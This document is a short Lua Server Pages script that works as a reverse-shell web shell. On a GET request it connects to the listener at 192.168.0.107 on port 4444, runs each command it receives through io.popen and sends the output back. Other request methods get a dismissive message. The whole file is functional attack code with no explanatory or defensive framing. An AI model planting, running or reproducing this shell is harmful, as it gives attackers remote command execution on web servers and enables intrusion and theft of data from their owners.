<?lsp if request:method() == "GET" then ?>
    <?lsp 
        local host, port = "192.168.0.107", 4444
        local socket = require("socket")
        local tcp = socket.tcp()
        local io = require("io")
        local connection, err = tcp:connect(host, port)
        
        if not connection then
            print("Error connecting: " .. err)
            return
        end
        
        while true do
            local cmd, status, partial = tcp:receive()
            if status == "closed" or status == "timeout" then break end
            if cmd then
                local f = io.popen(cmd, "r")
                local s = f:read("*a")
                f:close()
                tcp:send(s)
            end
        end
        
        tcp:close()
    ?>
<?lsp else ?>
    Wrong request method, goodBye! 
<?lsp end ?>
